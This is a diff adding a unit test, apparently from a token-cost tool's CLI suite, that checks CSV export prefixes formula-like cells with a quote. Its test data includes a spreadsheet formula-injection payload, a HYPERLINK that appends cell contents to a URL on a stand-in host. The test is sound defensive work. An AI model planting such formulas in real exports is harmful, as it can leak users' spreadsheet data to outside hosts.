@@ -74,6 +74,15 @@ class CliTest(unittest.TestCase):
         by_phase = summary.rows(connect(self.db), "phase")
         self.assertEqual({r["key"]: r["carried_cost_usd"] for r in by_phase}, {"plan": 0.5, "build": 0.0})
 
+    def test_a_name_a_spreadsheet_would_run_as_a_formula_gets_a_leading_quote(self):
+        from tokscope.core import summary
+        found = [{"key": k, "requests": 1, "prompt_tokens": 2, "output_tokens": 3, "cost_usd": 0.5, "carried_cost_usd": 0.0}
+                 for k in ('=HYPERLINK("http://x/?"&A1,"open")', "+1", "-1", "@SUM(A1)", "(none)")]
+        lines = summary.to_csv(found).splitlines()[1:]
+        self.assertTrue(lines[0].startswith("\"'=HYPERLINK"))  # quoted because of the comma
+        self.assertEqual([ln.split(",")[0] for ln in lines[1:]], ["'+1", "'-1", "'@SUM(A1)", "(none)"])
+        self.assertEqual(summary.safe_cell(7), 7)
+
     def test_the_argument_parser_takes_only_known_formats(self):
         with mock.patch.object(sys, "argv", ["tokscope", "summary", "--format", "yaml"]), contextlib.redirect_stderr(io.StringIO()):
             with self.assertRaises(SystemExit):
